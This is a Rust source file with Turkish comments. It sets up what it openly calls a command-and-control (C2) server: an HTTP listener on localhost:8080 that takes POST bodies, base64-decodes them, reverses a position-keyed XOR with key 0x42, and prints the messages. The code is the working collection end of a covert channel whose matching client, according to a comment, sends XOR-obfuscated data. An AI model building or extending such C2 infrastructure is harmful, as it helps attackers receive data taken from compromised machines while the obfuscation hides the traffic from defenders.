use tokio;
use warp::{self, Filter};
use base64::{Engine as _, engine::general_purpose};

#[tokio::main]
async fn main() {
    println!("C2 Server başlatılıyor...");
    println!("Dinleniyor: http://localhost:8080");

    // POST endpoint'i
    let c2_route = warp::post()
        .and(warp::body::bytes())
        .map(|bytes: bytes::Bytes| {
            // Base64 decode
            match general_purpose::STANDARD.decode(&bytes) {
                Ok(decoded) => {
                    // XOR decode (client ile aynı XOR_KEY kullanılmalı)
                    let xor_key = 0x42;
                    let mut decrypted = Vec::new();
                    for (i, &byte) in decoded.iter().enumerate() {
                        decrypted.push(byte ^ ((i * xor_key as usize) % 256) as u8);
                    }

                    // Mesajı yazdır
                    match String::from_utf8(decrypted) {
                        Ok(message) => {
                            println!("Alınan mesaj: {}", message);
                            "OK"
                        }
                        Err(_) => {
                            println!("Hatalı mesaj formatı!");
                            "ERROR"
                        }
                    }
                }
                Err(_) => {
                    println!("Base64 decode hatası!");
                    "ERROR"
                }
            }
        });

    // Server'ı başlat
    warp::serve(c2_route)
        .run(([127, 0, 0, 1], 8080))
        .await;
} 